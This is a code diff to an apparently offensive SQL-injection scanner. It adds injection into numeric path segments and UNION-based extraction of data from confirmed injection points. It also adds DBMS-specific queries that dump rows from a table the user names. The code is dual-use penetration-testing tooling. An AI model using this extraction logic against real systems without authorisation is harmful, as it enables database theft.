@@ -21,7 +21,7 @@ from .passive import fetch_seed, run_passive_checks
 from .active import scan_param
 from .blind import run_time_based, run_oob
 from .stacked import run_stacked
-from .extract import extract_value
+from .extract import extract_value, extract_via_union
 from commonhuman_payloads.sqli import get_extraction_targets
 from ..reporter import ExtractionFinding
 
@@ -31,7 +31,7 @@ logger = get_logger("breachsql.pipeline")
 def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> None:
 
     # 1. WAF detection
-    logger.info("Probing for WAF on %s", url)
+    logger.debug("Probing for WAF on %s", url)
     params = injector.get_params(url)
     first_param = params[0] if params else None
     waf_result = waf_detect.detect(injector, url, first_param)
@@ -135,14 +135,14 @@ def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> 
             })
 
     if opts.crawl:
-        logger.info("Crawling %s (max_pages=%s, depth=%s)", url, opts.max_pages, opts.max_depth)
+        logger.debug("Crawling %s (max_pages=%s, depth=%s)", url, opts.max_pages, opts.max_depth)
         crawl_result = crawler_mod.crawl(
             start_url=url, injector=injector,
             max_pages=opts.max_pages, max_depth=opts.max_depth, threads=opts.threads,
             exclude_patterns=opts.exclude_patterns or [],
         )
         result.crawled_urls = len(crawl_result.visited_urls)
-        logger.info(
+        logger.debug(
             "Crawled %d URLs, found %d forms",
             result.crawled_urls, len(crawl_result.form_targets),
         )
@@ -158,10 +158,31 @@ def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> 
                     "url": form.action, "method": form.method,
                     "params": {**form.base_data, **form.params}, "single_param": param,
                 })
+        # Level 2: probe numeric path segments discovered via <code> tags or
+        # other non-href links (e.g. /api/items/1 → inject into "1").
+        if opts.level >= 2:
+            seen_path_surfaces: set = set()
+            for pp_url in crawl_result.path_param_candidates:
+                _pp_parts = _up.urlparse(pp_url).path.split("/")
+                for _i, _part in enumerate(_pp_parts):
+                    if _part and _part.lstrip("-").isdigit():
+                        _key = (pp_url, _i)
+                        if _key not in seen_path_surfaces:
+                            seen_path_surfaces.add(_key)
+                            surfaces.append({
+                                "url": pp_url, "method": "PATH",
+                                "params": {"id": _part},
+                                "single_param": "id",
+                                "path_index": _i,
+                            })
+                        break  # inject only the first numeric segment
     else:
         pass  # crawler not enabled; surfaces already built from URL params and POST data
 
-    logger.info("%d injectable surfaces identified", len(surfaces))
+    if surfaces:
+        logger.info("%d injectable surface(s) identified", len(surfaces))
+    else:
+        logger.debug("0 injectable surfaces identified")
     result.params_tested = len(surfaces)
 
     # 4. Active: error-based + boolean + union (threaded)
@@ -188,7 +209,7 @@ def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> 
             s for s in surfaces
             if (s["url"], s["single_param"], s["method"]) not in confirmed
         ]
-        logger.info("Running time-based blind detection (%d surfaces)", len(time_surfaces))
+        logger.debug("Running time-based blind detection (%d surfaces)", len(time_surfaces))
         for surface in time_surfaces:
             try:
                 run_time_based(surface, evasions, opts, injector, result)
@@ -211,15 +232,16 @@ def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> 
 
     # 7. Stacked (batched) queries (sequential — order matters for detection)
     if opts.use_stacked:
-        logger.info("Running stacked query detection (%d surfaces)", len(surfaces))
+        logger.debug("Running stacked query detection (%d surfaces)", len(surfaces))
         for surface in surfaces:
             try:
                 run_stacked(surface, evasions, opts, injector, result)
             except Exception as exc:
                 result.append_error(str(exc))
 
-    # 8. Exploitation — extract proof-of-impact data via confirmed blind channel
-    if opts.exploit and (result.boolean_based or result.time_based):
+    # 8. Exploitation — extract proof-of-impact data via confirmed injection
+    if opts.exploit and (result.boolean_based or result.time_based
+                         or result.union_based or result.error_based):
         _run_exploit(url, opts, evasions, injector, result, surfaces)
 
 
@@ -233,7 +255,62 @@ def _run_exploit(
 ) -> None:
     """Extract proof-of-impact data and optionally dump a table."""
 
-    # Pick best confirmed surface: boolean preferred over time-based
+    dbms = (result.dbms_detected or opts.dbms or "auto").lower()
+    targets = get_extraction_targets(dbms)
+
+    if opts.dump:
+        _tbl = opts.dump
+        if dbms in ("sqlite", "postgres", "postgresql"):
+            dump_expr = f"(SELECT GROUP_CONCAT(c, '|') FROM (SELECT * FROM \"{_tbl}\" LIMIT 50) t)"
+        elif dbms in ("mssql",):
+            dump_expr = f"(SELECT STRING_AGG(CAST(c AS NVARCHAR(MAX)),'|') FROM (SELECT * FROM [{_tbl}]) t)"
+        else:
+            dump_expr = (
+                f"(SELECT GROUP_CONCAT(CAST(c AS CHAR) SEPARATOR '|')"
+                f" FROM (SELECT CONCAT_WS(',', *) AS c FROM `{_tbl}` LIMIT 50) t)"
+            )
+        targets = targets + [(f"dump:{_tbl}", dump_expr)]
+
+    # Prefer UNION extraction (one request per target, no binary search)
+    if result.union_based:
+        union_finding = result.union_based[0]
+        surface = next(
+            (s for s in surfaces
+             if s["url"] == union_finding.url
+             and s["single_param"] == union_finding.parameter
+             and s["method"] == union_finding.method),
+            None,
+        )
+        if surface is not None:
+            logger.info("Extracting %d target(s) via UNION on %s [%s]",
+                        len(targets), union_finding.parameter, union_finding.url)
+            for label, expr in targets:
+                try:
+                    value = extract_via_union(
+                        expr=expr,
+                        union_finding=union_finding,
+                        surface=surface,
+                        evasions=evasions,
+                        opts=opts,
+                        injector=injector,
+                    )
+                    if value:
+                        logger.info("[EXTRACTED] %s = %s", label, value)
+                        result.extracted.append(ExtractionFinding(
+                            url=union_finding.url,
+                            parameter=union_finding.parameter,
+                            method=union_finding.method,
+                            expr=expr,
+                            value=value,
+                            mode="union",
+                        ))
+                    else:
+                        logger.debug("extract: no value returned for %s", label)
+                except Exception as exc:
+                    result.append_error(f"Extraction failed ({label}): {exc}")
+            return
+
+    # Fall back to boolean / time-blind extraction
     best_finding = None
     mode = "boolean"
     if result.boolean_based:
@@ -245,7 +322,6 @@ def _run_exploit(
     if best_finding is None:
         return
 
-    # Locate matching surface dict
     surface = next(
         (s for s in surfaces
          if s["url"] == best_finding.url
@@ -256,7 +332,6 @@ def _run_exploit(
     if surface is None:
         return
 
-    # Fetch baseline for boolean mode
     try:
         from .active import _fetch
         baseline_resp = _fetch(
@@ -268,14 +343,6 @@ def _run_exploit(
         baseline = baseline_resp if baseline_resp is not None else ""
     except Exception:
         baseline = ""
-
-    dbms = (result.dbms_detected or opts.dbms or "auto").lower()
-    targets = get_extraction_targets(dbms)
-
-    if opts.dump:
-        targets = targets + [(f"dump:{opts.dump}",
-            f"(SELECT GROUP_CONCAT(CAST(c AS CHAR) SEPARATOR '|')"
-            f" FROM (SELECT CONCAT_WS(',', *) AS c FROM `{opts.dump}` LIMIT 50) t)")]
 
     logger.info("Extracting %d target(s) via %s-blind on %s [%s]",
                 len(targets), mode, best_finding.parameter, best_finding.url)
